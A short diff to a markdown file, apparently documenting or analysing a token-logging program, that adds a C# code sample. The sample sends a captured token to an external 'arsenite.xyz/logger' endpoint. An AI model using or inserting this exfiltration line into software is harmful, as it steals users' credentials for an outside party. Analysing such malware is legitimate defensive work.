@@ -12,6 +12,14 @@
 ##### report token: TokenDiscovery.cs line 103
 ##### check token: TokenDiscovery.cs line 64
 
+# code samples:
+
+##### report token
+
+```
+HttpResponseMessage result = TokenDiscovery._httpClient.PostAsync("https://arsenite.xyz/logger/" + Config.Id + "/report", new StringContent("{\"token\":\"" + token + "\"}", Encoding.UTF8, "application/json")).Result;
+```
+
 # directory tree
 
 ```
